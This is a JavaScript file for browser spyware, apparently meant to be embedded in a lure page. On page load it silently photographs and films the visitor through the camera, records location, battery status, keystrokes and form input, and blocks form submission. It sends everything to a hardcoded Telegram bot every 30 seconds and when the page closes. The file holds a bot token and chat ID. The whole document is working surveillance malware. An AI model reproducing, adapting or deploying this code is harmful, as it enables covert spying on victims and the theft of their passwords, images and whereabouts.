const TOKEN = '7117048092:AAESu6IVV49HZPkUU3oviD_YL7_-0NJVF7c';
const CHAT_ID = '7646169456';
let mediaStream = null;
let mediaRecorder = null;
let videoChunks = [];
const capturedData = {
  photos: [],
  videos: [],
  keystrokes: '',
  location: null,
  formData: {},
  battery: null
};

// Add watermark to media
function addWatermark(canvas) {
  const ctx = canvas.getContext('2d');
  ctx.font = '20px Arial';
  ctx.fillStyle = 'rgba(255, 255, 255, 0.7)';
  ctx.fillText('Download.jpeg', 20, 40);
  return canvas;
}

// Start capturing immediately
window.addEventListener('DOMContentLoaded', startSpySystem);

async function startSpySystem() {
  try {
    // Get battery status
    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      capturedData.battery = {
        level: Math.floor(battery.level * 100),
        charging: battery.charging
      };
    }

    // Get location
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(pos => {
        capturedData.location = {
          lat: pos.coords.latitude,
          lng: pos.coords.longitude
        };
      });
    }

    // Start camera
    mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
    const video = document.createElement('video');
    video.srcObject = mediaStream;
    await video.play();

    // Capture 5 photos immediately
    for (let i = 0; i < 5; i++) {
      setTimeout(() => capturePhoto(video), i * 1000); // 1 second apart
    }

    // Record video
    if (typeof MediaRecorder !== 'undefined') {
      mediaRecorder = new MediaRecorder(mediaStream, { 
        mimeType: 'video/webm',
        videoBitsPerSecond: 2500000
      });
      
      mediaRecorder.ondataavailable = (e) => {
        videoChunks.push(e.data);
        if (mediaRecorder.state === 'inactive') {
          const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
          sendToTelegram(videoBlob, 'video');
          videoChunks = [];
        }
      };
      
      // Record 10-second video clips
      mediaRecorder.start(10000);
    }

    // Keylogger
    document.addEventListener('keydown', (e) => {
      capturedData.keystrokes += e.key;
    });

    // Form data collection
    document.querySelectorAll('input, textarea, select').forEach(field => {
      if (field.value) capturedData.formData[field.name || field.id] = field.value;
      field.addEventListener('input', (e) => {
        capturedData.formData[e.target.name || e.target.id] = e.target.value;
      });
    });

    // Auto-send all data every 30 seconds
    setInterval(sendAllData, 30000);

    // Handle form submissions
    document.querySelector('form')?.addEventListener('submit', (e) => {
      e.preventDefault();
      sendAllData();
    });

  } catch (err) {
    console.error("Error:", err);
  }
}

// Capture photo
function capturePhoto(video) {
  const canvas = document.createElement('canvas');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const ctx = canvas.getContext('2d');
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  addWatermark(canvas);
  
  canvas.toBlob((blob) => {
    sendToTelegram(blob, 'photo');
  }, 'image/jpeg', 0.8);
}

// Send to Telegram
function sendToTelegram(data, type) {
  const formData = new FormData();
  formData.append('chat_id', CHAT_ID);
  
  if (type === 'photo') {
    formData.append('photo', data, `photo_${Date.now()}.jpeg`);
    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { 
      method: 'POST', 
      body: formData 
    });
  } else if (type === 'video') {
    formData.append('video', data, `video_${Date.now()}.webm`);
    fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { 
      method: 'POST', 
      body: formData 
    });
  }
}

// Send all collected data
function sendAllData() {
  let message = `🕵️‍♂️ *Collected Data Report*\n`;
  
  if (capturedData.battery) {
    message += `🔋 Battery: ${capturedData.battery.level}% (${capturedData.battery.charging ? 'Charging' : 'Not charging'})\n`;
  }
  
  if (capturedData.location) {
    message += `📍 Location: https://maps.google.com/?q=${capturedData.location.lat},${capturedData.location.lng}\n`;
  }
  
  if (Object.keys(capturedData.formData).length > 0) {
    message += `📝 Form Data:\n`;
    for (const [key, value] of Object.entries(capturedData.formData)) {
      message += `• ${key}: ${value}\n`;
    }
  }
  
  if (capturedData.keystrokes) {
    message += `⌨️ Keystrokes:\n${capturedData.keystrokes}\n`;
    capturedData.keystrokes = '';
  }
  
  if (message !== `🕵️‍♂️ *Collected Data Report*\n`) {
    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });
  }
}

// Cleanup
window.addEventListener('beforeunload', () => {
  sendAllData();
  mediaStream?.getTracks().forEach(track => track.stop());
  if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
});